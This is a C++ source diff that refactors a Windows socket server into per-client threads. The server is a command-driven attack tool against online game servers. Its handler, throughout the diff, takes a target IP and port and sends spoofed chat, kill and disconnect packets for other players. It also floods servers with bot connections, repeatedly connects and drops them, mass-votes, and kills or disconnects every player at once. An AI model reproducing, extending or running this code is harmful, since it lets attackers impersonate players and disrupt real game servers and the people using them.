@@ -8,6 +8,7 @@
 #include <string.h>
 #include <iostream>
 #include <fstream>
+#include <memory>
 #include <string>
 
 #include "winsock2.h"
@@ -17,90 +18,109 @@
 
 #pragma comment(lib,"ws2_32.lib") //winsock 2.2 library
 
-#include "packetgen.h"
+#include "client.h"
 #include "core.h"
 #include "networking.h"
 
-struct Client
-{
-	HANDLE handle;
-	SOCKET socket;
-	int lastAck;
-	int dummieSpam;
-	char dummiesIP[64];
-	int dummiesPort;
-};
 
-Client clients[MAX_CLIENTS];
-bool restart = false; // setting this to true will instantly restart the zervor
+DWORD WINAPI UpdateThread(LPVOID lpParam);
+DWORD WINAPI WorkingThread(LPVOID lpParam);
 
-void Drop(int client)
+
+Client::Client(int i, SOCKET s)
+	: id(i), socket(s)
 {
-	clients[client].lastAck = 0;
-	if (GetConnectedDummies(client) > 0)
-		SendDisconnectDummies(client);
-	TerminateThread(clients[client].handle, 0);
+	m_pPacketgen = new Packetgen(this);
+
+	lastAck = TIMEOUT_SEC;
+	dummieSpam = 0;
+	memset(dummiesIP, 0, sizeof(dummiesIP));
+	dummiesPort = 0;
+
+	char aBuf[3];
+	sprintf_s(aBuf, sizeof(aBuf), "%d", id);
+	send(socket, aBuf);
+
+	handle[Client::UPDATE_THREAD] = CreateThread(NULL, 0,UpdateThread, (LPVOID)this, 0, &thread[Client::UPDATE_THREAD]);
+	handle[Client::WORKING_THREAD] = CreateThread(NULL, 0, WorkingThread, (LPVOID)this, 0, &thread[Client::WORKING_THREAD]);
 }
 
-void Update()
+Client::~Client()
 {
-	if(restart)
-		return;
+	// terminate all threads
+	for(int i = 0; i < Client::NUM_THREADTYPES; i++)
+		TerminateThread(handle[i], 0);
 
-	static time_t t = time(NULL);
+	// close socket
+	closesocket(socket);
+	CloseSocket(this);
 
-	if (time(NULL) >= t + 1) //1 sec
+	delete m_pPacketgen;
+}
+
+//Client *clients[MAX_CLIENTS];
+
+bool restart = false; // setting this to true will instantly shutdown the zervor (use restart skript!)
+
+void Client::Drop(bool dc)
+{
+	if (m_pPacketgen->GetConnectedDummies() > 0)
+		m_pPacketgen->SendDisconnectDummies();
+	if(dc)
+		printf("Client #%d disconnected\n", id);
+	else
+		printf("Dropping client #%d\n", id);
+
+	delete this;
+}
+
+DWORD WINAPI UpdateThread(LPVOID lpParam)
+{
+	Client *pSelf = (Client *)lpParam;
+	time_t t = time(NULL);
+
+	while(1)
 	{
-		time(&t);
-		for (int i = 0; i < MAX_CLIENTS; i++)
+		//if(pSelf->ShouldTerminate())
+		//	return;
+
+		if (time(NULL) >= t + 1) //1 sec
 		{
-			if (clients[i].lastAck != 0) //if client's online
+			if (pSelf->DoAck() < 1)
 			{
-				//printf("#%d %d | %d\n", i, clients[i].lastAck, (int)t);
-
-				if (clients[i].lastAck > 1)
-					clients[i].lastAck--;
-				else
-				{
-					//timeout
-					printf("Client #%d timed out (not acked for %i seconds)\n", i, TIMEOUT_SEC);
-					send(clients[i].socket, "\x04\x15");
-					Sleep(1000);
-					Drop(i);
-					
-				}
-
-				SendKeepAliveDummies(i);
-				SendEmoteDummies(i, 1);
+				//timeout
+				printf("Client #%d timed out (not acked for %i seconds)\n", pSelf->GetID(), TIMEOUT_SEC);
+				send(pSelf->GetSocket(), "\x04\x15");
+				Sleep(1000);
+				pSelf->Drop();		
 			}
-		}
-	}
 
-	for (int i = 0; i < MAX_CLIENTS; i++)
-	{
-		if (clients[i].lastAck != 0) //if client's online
+			pSelf->GetPacketgen()->SendKeepAliveDummies();
+			pSelf->GetPacketgen()->SendEmoteDummies(rand()%15); // XXX: random emoticon
+
+			time(&t);
+		}
+
+		if(pSelf->dummieSpam > 0)
 		{
-			if(clients[i].dummieSpam > 0)
-			{
-				// fuck 100ms right here, noone fucking cares man.
-				//Sleep(25);
-				SendConnectDummies(i, inet_addr(clients[i].dummiesIP), htons(clients[i].dummiesPort), clients[i].dummieSpam, 0);
-				Sleep(25);
-				SendDisconnectDummies(i);
-			}
+			// fuck this few milliseconds right here, noone fucking cares man.
+			Sleep(100-1);
+			pSelf->GetPacketgen()->SendConnectDummies(inet_addr(pSelf->dummiesIP), htons(pSelf->dummiesPort), pSelf->dummieSpam, 0, "verkeckt!");
+			Sleep(100);
+			pSelf->GetPacketgen()->SendDisconnectDummies("verkeckt!");
 		}
+
+		Sleep(2);
 	}
 }
 
 DWORD WINAPI WorkingThread(LPVOID lpParam)
 {
-	SOCKET g_Client = clients[(int)lpParam].socket;
-	int client = (int)lpParam;
+	Client *pSelf = (Client *)lpParam;
+	SOCKET g_Client = pSelf->GetSocket();
+	int client = pSelf->GetID();
 
 	//printf("Created new thread #%d\n", clientID);
-
-	char buffer[256];
-	srand((unsigned int)time(NULL));
 
 	//id msg and welcome send in one packet, no other idea how to flush the socket to prevent that
 	Sleep(250);
@@ -109,7 +129,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 
 	while (1)
 	{
-		memset(&buffer, 0, sizeof(buffer));
+		char buffer[256] = {0};
 
 		if (recv(g_Client, buffer, sizeof(buffer), 0) != SOCKET_ERROR)
 		{
@@ -134,24 +154,13 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 
 			if (strcmp(aCmd[0], "keepalive") == 0 || strcmp(aCmd[0], "\x16") == 0) // keep alive
 			{
-				if (aCmd[1][0])
-				{
-					int id = atoi(aCmd[1]);
-					if (id > MAX_CLIENTS || id < 0)
-						send(g_Client, "[Server]: Invalid client's id.");
-					else
-					{
-						send(g_Client, "\x16"); // send back to the client
-						clients[id].lastAck = TIMEOUT_SEC;
-					}
-				}
-				else
-					send(g_Client, "[Server]: Id not found.");
+				send(g_Client, "\x16"); // send back to the client
+				pSelf->ResetAck();
 			}
 			else if (strcmp(aCmd[0], "restart") == 0) // keep alive
 			{
 				restart = true;
-				send(g_Client, "[Server]: Restarting!");
+				send(g_Client, "[Server]: Restarting!"); // TODO: send this to all clients!
 			}
 			else if (strcmp(aCmd[0], "status") == 0) // status
 			{
@@ -171,7 +180,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 					for (int i = 5; i <= Cmd; i++)
 						sprintf_s(aMsg, sizeof(aMsg), "%s %s", aMsg, aCmd[i]);
 
-					SendChat(client, inet_addr(aCmd[1]), htons(atoi(aCmd[2])), inet_addr(aCmd[3]), htons(atoi(aCmd[4])), aMsg);
+					pSelf->GetPacketgen()->SendChat(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), inet_addr(aCmd[3]), htons(atoi(aCmd[4])), aMsg);
 
 					send(g_Client, "[Server]: Spoofed chat message sent successfully!");
 				}
@@ -182,7 +191,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 			{
 				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
 				{
-					SendKill(client, inet_addr(aCmd[1]), htons(atoi(aCmd[2])), inet_addr(aCmd[3]), htons(atoi(aCmd[4])));
+					pSelf->GetPacketgen()->SendKill(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), inet_addr(aCmd[3]), htons(atoi(aCmd[4])));
 
 					send(g_Client, "[Server]: Spoofed kill sent successfully!");
 				}
@@ -193,7 +202,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 			{
 				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
 				{
-					SendDisconnect(client, inet_addr(aCmd[1]), htons(atoi(aCmd[2])), inet_addr(aCmd[3]), htons(atoi(aCmd[4])));
+					pSelf->GetPacketgen()->SendDisconnect(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), inet_addr(aCmd[3]), htons(atoi(aCmd[4])));
 
 					send(g_Client, "[Server]: Spoofed disconnect sent successfully!");
 				}
@@ -207,9 +216,9 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 					int number = atoi(aCmd[3]);
 					if (number > 0 && number <= MAX_DUMMIES_PER_CLIENT)
 					{
-						if (GetConnectedDummies(client) == 0)
+						if (pSelf->GetPacketgen()->GetConnectedDummies() == 0)
 						{
-							SendConnectDummies(client, inet_addr(aCmd[1]), htons(atoi(aCmd[2])), number, 0);
+							pSelf->GetPacketgen()->SendConnectDummies(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), number, 0, "SPAß IM LEBEN, YAA!");
 							send(g_Client, "[Server]: Dummies connected!");
 						}
 						else
@@ -227,9 +236,9 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 			}
 			else if (strcmp(aCmd[0], "disconnectdummies") == 0 || strcmp(aCmd[0], "dcdummies") == 0 || strcmp(aCmd[0], "dcdum") == 0)
 			{
-				if (GetConnectedDummies(client) > 0)
+				if (pSelf->GetPacketgen()->GetConnectedDummies() > 0)
 				{
-					SendDisconnectDummies(client);
+					pSelf->GetPacketgen()->SendDisconnectDummies();
 					send(g_Client, "[Server]: Dummies disconnected.");
 				}
 				else
@@ -245,9 +254,9 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 						sprintf_s(aMsg, sizeof(aMsg), "%s %s", aMsg, aCmd[i]);
 					}
 
-					if (GetConnectedDummies(client) > 0)
+					if (pSelf->GetPacketgen()->GetConnectedDummies() > 0)
 					{
-						SendChatDummies(client, aMsg);
+						pSelf->GetPacketgen()->SendChatDummies(aMsg);
 						send(g_Client, "[Server]: Chatmessage was sent from all dummies!");
 					}
 					else
@@ -261,22 +270,19 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
 				{
 					int number = atoi(aCmd[3]);
-					if (number > 0 && number <= MAX_DUMMIES_PER_CLIENT)
+					if(pSelf->dummieSpam)
 					{
-						if (GetConnectedDummies(client) == 0)
+						pSelf->dummieSpam = 0;
+						send(g_Client, "[Server]: Dummyspam stopped!");
+					}
+					else if (number > 0 && number <= MAX_DUMMIES_PER_CLIENT)
+					{
+						if (pSelf->GetPacketgen()->GetConnectedDummies() == 0)
 						{
-							if(!clients[client].dummieSpam)
-							{
-								clients[client].dummieSpam = number;
-								sprintf_s(clients[client].dummiesIP, sizeof(clients[client].dummiesIP), aCmd[1]);
-								clients[client].dummiesPort = atoi(aCmd[2]);
-								send(g_Client, "[Server]: Dummyspam started!");
-							}
-							else
-							{
-								clients[client].dummieSpam = 0;
-								send(g_Client, "[Server]: Dummyspam stopped!");
-							}
+							pSelf->dummieSpam = number;
+							sprintf_s(pSelf->dummiesIP, sizeof(pSelf->dummiesIP), aCmd[1]);
+							pSelf->dummiesPort = atoi(aCmd[2]);
+							send(g_Client, "[Server]: Dummyspam started!");
 						}
 						else
 							send(g_Client, "[Server]: Disconnect active dummies first.");
@@ -299,9 +305,9 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 					int vote = atoi(aCmd[4]);
 					if (number > 0 && number <= MAX_DUMMIES_PER_CLIENT)
 					{
-						if (GetConnectedDummies(client) == 0)
+						if (pSelf->GetPacketgen()->GetConnectedDummies() == 0)
 						{
-							SendConnectDummies(client, inet_addr(aCmd[1]), htons(atoi(aCmd[2])), number, vote);
+							pSelf->GetPacketgen()->SendConnectDummies(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), number, vote);
 							send(g_Client, "[Server]: Dummies connected (voting...)!");
 						}
 						else
@@ -321,7 +327,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 			{
 				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
 				{
-					SendVoteAll(client, inet_addr(aCmd[1]), htons(atoi(aCmd[2])), atoi(aCmd[3]));
+					pSelf->GetPacketgen()->SendVoteAll(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), atoi(aCmd[3]));
 					send(g_Client, "[Server]: Votes sent successfully!");
 				}
 				else
@@ -331,7 +337,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 			{
 				if (aCmd[1][0] && aCmd[2][0])
 				{
-					SendListIpAll(client, inet_addr(aCmd[1]), htons(atoi(aCmd[2])));
+					pSelf->GetPacketgen()->SendListIpAll(inet_addr(aCmd[1]), htons(atoi(aCmd[2])));
 					send(g_Client, "[Server]: IP-spam sent successfully!");
 				}
 				else
@@ -341,7 +347,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 			{
 				if (aCmd[1][0] && aCmd[2][0])
 				{
-					SendKillAll(client, inet_addr(aCmd[1]), htons(atoi(aCmd[2])));
+					pSelf->GetPacketgen()->SendKillAll(inet_addr(aCmd[1]), htons(atoi(aCmd[2])));
 					send(g_Client, "[Server]: All players have been killed!");
 				}
 				else
@@ -351,7 +357,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 			{
 				if (aCmd[1][0] && aCmd[2][0])
 				{
-					SendDisconnectAll(client, inet_addr(aCmd[1]), htons(atoi(aCmd[2])));
+					pSelf->GetPacketgen()->SendDisconnectAll(inet_addr(aCmd[1]), htons(atoi(aCmd[2])));
 					send(g_Client, "[Server]: All players have been disconnected!");
 				}
 				else
@@ -366,7 +372,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 					{
 						sprintf_s(aMsg, sizeof(aMsg), "%s %s", aMsg, aCmd[i]);
 					}
-					SendChatAll(client, inet_addr(aCmd[1]), htons(atoi(aCmd[2])), aMsg);
+					pSelf->GetPacketgen()->SendChatAll(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), aMsg);
 					send(g_Client, "[Server]: Chatmessage was sent from all players!");
 				}
 				else
@@ -376,8 +382,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 			{
 				//send(g_Client, "[Server]: Closing thread... Goodbye!");
 				send(g_Client, "\x04\x06");
-				printf("Client #%i disconnected\n");
-				Drop(client);
+				pSelf->Drop(true);
 			}
 			else
 				send(g_Client, "[Server]: Unknown command.");
@@ -388,7 +393,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 
 int _tmain(int argc, _TCHAR* argv[])
 {
-	DWORD Thread;
+	//DWORD Thread;
 	WSADATA data;
 	SOCKET g_Server, g_Client;
 	SOCKADDR_IN info, client_info;
@@ -397,6 +402,8 @@ int _tmain(int argc, _TCHAR* argv[])
 	char aBuf[32] = {0};
 
 	printf("Starting...\n");
+
+	srand((unsigned int)time(NULL));
 
 	// WSA
 	if (WSAStartup(MAKEWORD(2, 0), &data) != 0)
@@ -455,10 +462,8 @@ inf:
 	printf("Initialization successful!\n");
 	printf("Waiting for clients...\n");
 
-	while (1) //used for updating
+	while (1) // listens for new connection attempts
 	{
-		Update();
-
 		if(restart)
 			break;
 
@@ -466,25 +471,16 @@ inf:
 
 		if (g_Client != SOCKET_ERROR)
 		{
-			if (clientCount > MAX_CLIENTS)
-				clientCount = 0;
+			/*clients[clientCount] = */new Client(clientCount, g_Client);
 
 			printf("Client #%d accepted: %s:%i\n", clientCount, inet_ntoa(client_info.sin_addr), ntohs(client_info.sin_port));
-			
-			sprintf_s(aBuf, sizeof(aBuf), "%d", clientCount);
-			send(g_Client, aBuf);
-			
-			clients[clientCount].lastAck = TIMEOUT_SEC;
-			clients[clientCount].socket = g_Client;
-
-			// create a thread for multi-client support!
-			clients[clientCount].handle = CreateThread(NULL, 0, WorkingThread, (LPVOID)clientCount, 0, &Thread);
 
 			clientCount++;
 		}
-		Sleep(1);
+		Sleep(2);
 	}
 
+	printf("Shutting down!");
 	closesocket(g_Server);
 	WSACleanup();
 	return 0;
